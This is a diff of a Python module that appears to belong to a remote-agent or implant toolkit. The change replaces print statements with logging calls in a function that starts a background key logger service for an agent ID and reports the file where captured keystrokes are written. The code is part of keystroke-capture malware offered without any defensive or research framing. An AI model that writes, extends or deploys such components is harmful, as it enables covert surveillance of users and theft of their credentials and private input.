@@ -1,19 +1,20 @@
 from config.settings import KEYLOG_FILE
 from actions.keylogger import start_keylogger
+from logger import logger
 
 def start_keylogger_service(agent_id):
     """Start the key logger service in a background thread."""
     try:
         if agent_id is None:
-            print("[!] No agent ID found. Key logger will not start.")
+            logger.error("No agent ID found. Key logger will not start.")
             return
         
         listener = start_keylogger(agent_id)
 
         if listener is None:
-            print("[!] Key logger disabled.")
+            logger.error("Key logger disabled.")
         else:
-            print(f"[+] Key logger running → {KEYLOG_FILE}")
+            logger.info(f"Key logger running → {KEYLOG_FILE}")
 
     except Exception as e:
-        print(f"[!] Key logger error: {e}")
+        logger.error(f"Key logger error: {e}")
